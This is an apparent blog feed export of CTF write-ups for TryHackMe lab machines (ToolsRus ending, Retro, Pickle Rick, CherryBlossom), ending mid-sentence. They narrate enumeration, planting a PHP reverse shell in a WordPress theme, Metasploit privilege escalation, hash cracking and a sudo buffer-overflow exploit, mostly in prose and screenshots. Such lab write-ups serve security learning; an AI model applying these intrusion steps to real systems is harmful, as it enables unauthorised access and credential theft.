root@ip-10-10-27-83:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and here you are a root guru and you got the flag happy with that, but make sure to focus more on the most important part, is to understand why does it work, why exactly when you ran exploit or run in that msfconsole it gave you back a reverse shell, if you are interested on reading more about this exploit, I will leave the ruby file of the exploit used in metasploit and more details on the exploit itself.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/rapid7/metasploit-framework"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;rapid7/metasploit-framework&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Metasploit Framework. Contribute to rapid7/metasploit-framework development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="ToolsRus CTF | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;rapid7&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars3.githubusercontent.com/u/1013671?s=400&amp;amp;v=4" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Apache Tomcat Manager Authenticated Upload Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Rapid7′s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.rapid7.com/includes/img/favicon.ico" alt="ToolsRus CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;Rapid7&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.rapid7.com/globalassets/rapid7-og.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.cvedetails.com/cve/CVE-2009-3548/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a blank default password for the administrative user, which allows remote attackers to gain privileges.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.cvedetails.com/img/logo2.png" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Retro | write-up</title><description>&lt;p&gt;Hello every one, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server bases on windows, before we start enumerating the machine we have to take in consideration the note we got, which is we won't get any response for any ping request, nmap&lt;/p&gt;</description><link>http://localhost:2368/ghostcat-write-up/</link><guid isPermaLink="false">5e87092e8178f03c2e87f649</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 11:01:50 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/HJI.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/HJI.png" alt="Retro | write-up"&gt;&lt;p&gt;Hello every one, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server bases on windows, before we start enumerating the machine we have to take in consideration the note we got, which is we won't get any response for any ping request, nmap does have a flag for that &lt;strong&gt;-nP&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo nmap -Pn -sV -p- -vv &amp;lt;target-machine&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.55.36-1.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;After the quick scan we did on our target, we can see that it is a IIS Windows Server, port 80 is running an http server and we have port 3389 that can allow us to get a remote desktop {RDP} &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.56.26.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.59.08.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.59.36.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;So we visited the port 80, found the landing page of windows server kept digging for directories the only one that is available is &lt;strong&gt;/retro&lt;/strong&gt; or &lt;strong&gt;/Retro&lt;/strong&gt;, it doesn't matter.&lt;/p&gt;&lt;p&gt;the first thing got my eye is the User who shared the article in this site &lt;strong&gt;"Wade"&lt;/strong&gt; I clicked on the user it showed me all the articles shared by the user, it felt like a wordpress but I wanted to make sure that it is! I ran another directory scan in the directory &lt;strong&gt;/retro&lt;/strong&gt; to see if we have anything, but before that, a comment got my eye.&lt;/p&gt;&lt;p&gt;It looks like our user Wade doesn't have a very good memory so he left us a little note in a comment on one of his articles.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.00.38.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.01.50.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just like i thought, it is a wordpress! let's jump to wp-login.php and use the username we have and the note the user left just in case he forgets it, maybe its a bluff or maybe a hint for the password.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.02.35.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;well guess what it is the password for the user, the next part of the logging i got too excited and forgot to take screenshots, so the step after i created a php reverse shell with &lt;strong&gt;msfvenom&lt;/strong&gt; and went to the theme editor in the dashboard, used the &lt;strong&gt;404.php&lt;/strong&gt; to insert my php code opened metasploit set up my settings and ran the listener and we got a shell &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.04.41.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.09.18.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/IPqbZhStIeZdS" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rainbow-nintendo-mario-IPqbZhStIeZdS"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;Privilege escalation time &lt;/blockquote&gt;&lt;p&gt;It is a windows machine so i ran &lt;strong&gt;&lt;a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"&gt;Windows-Exploit-Suggester&lt;/a&gt; &lt;/strong&gt;made&lt;strong&gt; &lt;/strong&gt;by&lt;strong&gt; &lt;a href="https://github.com/AonCyberLabs"&gt;Aon's Cyber Labs&lt;/a&gt; &lt;/strong&gt;it's a very powerful python script and straight forward so i saved the systeminfo of the machine, ran the command and got all the exploits that can be used for this specific version of window server, in the command i added at the end &lt;strong&gt;-l&lt;/strong&gt; to tell our script to find local exploits, because we want &lt;strong&gt;Administrator&lt;/strong&gt; user&lt;/p&gt;&lt;pre&gt;&lt;code&gt;python windows-exploit-suggester.py --database &amp;lt;xls database  of exploits provided with the script&amp;gt; --systeminfor &amp;lt;systeminfo saved in a txt file&amp;gt; --ostext &amp;lt;Os&amp;gt; -l&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.41.27.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.36.40-1.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Let's use &lt;strong&gt;MS16-075&lt;/strong&gt;, as we can see the bug is considered medium risk because you need to have access first to the machine and then exploit it if you want to read more about this vulnerability click &lt;strong&gt;&lt;a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-075"&gt;MS16-075&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.43.22.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;metasploit does have the exploit there, all you have to do is use the exploit look at the options, one of the requirements is a session in metasploit that we already have you set the number of the session, run the exploit and we have a shell running NT AUTHORITY\SYSTEM.&lt;/p&gt;&lt;p&gt;That's it for today if you have any question don't be shy getting in touch, and don't forget that what I used is the easy way to exploit this machine, feel free to explore the other ways in.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>Pickle Rick CTF | write-up</title><description>&lt;hr&gt;&lt;p&gt;Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box i enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;nmap -sC -sV &lt;strong&gt;&amp;lt;target-machine&amp;gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image"&gt;&lt;/figure&gt;&lt;p&gt;it looks like we don't have much to break, two ports.&lt;/p&gt;</description><link>http://localhost:2368/pickle-rick/</link><guid isPermaLink="false">5e86049fb466e53421ba6f62</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 02 Apr 2020 15:41:21 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/rick_morty.jpg" medium="image"/><content:encoded>&lt;hr&gt;&lt;img src="http://localhost:2368/content/images/2020/04/rick_morty.jpg" alt="Pickle Rick CTF | write-up"&gt;&lt;p&gt;Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box i enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;nmap -sC -sV &lt;strong&gt;&amp;lt;target-machine&amp;gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;it looks like we don't have much to break, two ports. 22 for ssh and 80 http, So first what i usually do is give a quick check to the source code of the site in case something is hidden there, and after we have an idea about what we are dealing with, let's check for some directories&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.49-1.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.06.28.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.14.10.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;That is such a weird robots.txt file! it may be something useful for us, so we will keep it aside and it is weird that we have a username without login panel let's nikto the hell of this box&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.06.35.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.07.01.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.15.21.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after finding the login page first what I tried was the famous quote from Rick Wabbalubbadubdub!!!! and we got a command panel that connects us as the user www-data&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/l41lI4bYmcsPJX9Go" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rickandmorty-adult-swim-rick-and-morty-l41lI4bYmcsPJX9Go"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.16.51.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;so when we &lt;strong&gt;ls -la &lt;/strong&gt;we notice that there's two files Sup3rwhatever.txt and clue.txt let's try and open them in the browser.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.31.44.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.32.22.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the first file is our first &lt;strong&gt;flag&lt;/strong&gt;, the second file tells us to look around the system, for my case I tried to get a reverse shell because that command prompt wasn't satisfying, well guess what every time you'll get a reverse one it will shutdown no matter how much you'll try so don't dig hard in that rabbit hole, and the second thing the command panel we have filters the queries and if one of them is &lt;strong&gt;cat&lt;/strong&gt;, &lt;strong&gt;head&lt;/strong&gt;, &lt;strong&gt;tail&lt;/strong&gt;, whatever ... it won't work, lucky us we still have access to &lt;strong&gt;find &lt;/strong&gt;and&lt;strong&gt; less &lt;/strong&gt;that's all we need 🙃 after digging in directories with ls -la /stuff/that/linux/have. &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.59.31.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;here we go we have the second ingredients for rick, later when I was trying many commands to find files and try to use any process to access the root directory, I thought about the first thing i try to priv escalate which is &lt;strong&gt;sudo -l&lt;/strong&gt; and yep we had it all in front of our eyes&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-18.03.26.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-18.03.47.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and that's it you are root and you have the third file that contains the last flag for the machine and everything is done the headaches are gone, but to be honest it is a very cute challenge not hard at all, little bit of twists, but that's the beauty of it you better get used to it.&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;</content:encoded></item><item><title>CherryBlossom CTF | write-up</title><description>&lt;p&gt;Hello all, this is my first write-up at this page If you see anything not right or have any corrections I would be very happy getting some feedback, anyways lets start our write-up, Today we'll review a CTF challenge on &lt;a href="https://tryhackme.com/"&gt;TryHackme&lt;/a&gt; CherryBlossom. This challenge is rated hard and it focuses&lt;/p&gt;</description><link>http://localhost:2368/cherryblossom-ctf-write-up/</link><guid isPermaLink="false">5e8498785a6fba01623b5688</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Wed, 01 Apr 2020 13:42:48 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/cherryCTF-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/cherryCTF-1.png" alt="CherryBlossom CTF | write-up"&gt;&lt;p&gt;Hello all, this is my first write-up at this page If you see anything not right or have any corrections I would be very happy getting some feedback, anyways lets start our write-up, Today we'll review a CTF challenge on &lt;a href="https://tryhackme.com/"&gt;TryHackme&lt;/a&gt; CherryBlossom. This challenge is rated hard and it focuses on file manipulation and cryptography.&lt;/p&gt;&lt;blockquote&gt;First of all we will start enumerating the machine&lt;/blockquote&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;nmap -sC -sV &lt;strong&gt;{target-host}&lt;/strong&gt;&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.03.30.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;we can see that there's three open ports 22 for SSH and 139-445 used by Samba, so far we have nothing except the samba, let's move on and scan the smb&lt;/p&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;nmap --script smb-enum-shares -vv &lt;strong&gt;{target-host}&lt;/strong&gt;&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.19.45.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and here we have something, an Anonymous file shared which means we can dig in with anonymous account and we may find something interesting.&lt;/p&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;smbclient \\&lt;strong&gt;{target-host}&lt;/strong&gt;\Anonymous&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;p&gt;we found a text file &lt;strong&gt;journal.txt &lt;/strong&gt;and when we open it, it contains a huge base64.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.19.58.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.20.49.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.21.41.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Decoding it give us an image, Let's save it as a png. After checking it with the command &lt;strong&gt;file&lt;/strong&gt;, it is a PNG.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.21.51.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Usually in Steganography challenges Jpeg are commonly  used, Steghide won't be able to work on this PNG which means we will need to use another tool called &lt;a href="https://github.com/dhsdshdhk/stegpy"&gt;stegpy&lt;/a&gt;, It easy to install all you have to do is &lt;strong&gt;pip3 install stegpy &lt;/strong&gt;and let's see what's hidden there&lt;/p&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;stegpy &lt;strong&gt;{file}&lt;/strong&gt;&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.13.52.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.14.17.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;we got a zip file! Unfortunately it look like our file is corrupted, Let's check the hex of the file to see if something is wrong with the tag &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.15.47.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;as it is provided in the picture it doesn't look fine, let's change it to what it's supposed to be &lt;strong&gt;50 4B 03 04&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.16.34.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.17.14.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;exit and save, it works! if you have the password 😶, Let's move on and extract that hash from the file, I will use fcrackzip to decrypt it but feel free to use whatever you like.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.20.13-1.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after decrypting the zip file, found an Encrypted Cherrytree document, one of the good ways to store data and diaries ... , if we use the command &lt;strong&gt;file&lt;/strong&gt; to check it, it will tell us that it's a 7z file, so let's &lt;strong&gt;7z2john&lt;/strong&gt; this baby file.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.24.06.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.30.06-1.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the diaries and privacy he had is shared with us, So let's have a look at what we've got there.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.41.42.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I exported the most interesting thing he had a wordlist called cherry-bolossm 🍒 and we got a username , this is getting fun now. Let's brute force the user &lt;strong&gt;lily &lt;/strong&gt;password with the wordlist we exported from the file.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.53.16.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.02.25.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Welcome, Lily! 😊 what a fun way we got this user, let's not get lost now and focus on our box.&lt;/p&gt;&lt;p&gt;There's no user flag because there's another user that have the flag and then the root! we got to pivot 😎 the username is &lt;strong&gt;Johan&lt;/strong&gt;. Let's browse on this machine.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.03.31.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the &lt;strong&gt;shadow.bak&lt;/strong&gt;  can be read by us which means we have something to get us to Mr Johan.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.04.08-2.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.06.37.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.08.38.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Et Voila, we decrypted the hash successfully and jumped from user lily to johan with the command:&lt;/p&gt;&lt;blockquote&gt;sudo -u johan&lt;/blockquote&gt;&lt;p&gt;we typed the password we got and we have the user flag, now what. We need to get root priv, first thing I do when I'm trying to privesc &lt;strong&gt;sudo -l &lt;/strong&gt;to see if the user is allowed to use anything as root and try to gain access with the power he got.&lt;/p&gt;&lt;p&gt;when I tried to type the password we got prompted to johan, which is weird and very unusual unsafe unwhatever, all I know is that we have a &lt;strong&gt;pwdfeedback (pasword feedback) &lt;/strong&gt;issue which means we are using a vulnerable version of sudo, found out we have a (CVE-2019-18634) &lt;strong&gt;sudo buffer overflow&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.19.57.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;tried what I read about in that CVE and our sudo version burped a Segmentation fault, which means we have a bufferoverflow over here ...&lt;/p&gt;&lt;blockquote&gt;talking about bufferoverflow if you don't understand the vulnerability here's a very good video linked&lt;/blockquote&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;iframe width="480" height="270" src="https://www.youtube.com/embed/1S0aBV-Waeo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.25.54.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.26.21.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I downloaded the exploit coded in C language, gave it permission to be executed and boom we got a root user, all we have to do now is go to /root/ directory and the file root.txt fill contain our flag and here you go you are no longer upset with your low privileges. &lt;/p&gt;&lt;p&gt;I really enjoyed this machine, learned many things the diary thing encryption, cryptography 101, backups are bad with wrong permissions, and png can contain files, ... and mostly to not forget and make it clear for anyone who comes and ask me if the bufferoverflow ...  YES, they do still exist!!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/S3Ot3hZ5bcy8o" width="480" height="375" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/jack-nicholson-nodding-anger-management-S3Ot3hZ5bcy8o"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;The bufferoverflow thing continues to be a feature of the security landscape as long as we are still using C language. This is in no small part due to the significant issue of legacy code. An awful lot of C code still exists, including the kernel of every major operating system and popular libraries such as OpenSSL. Even if 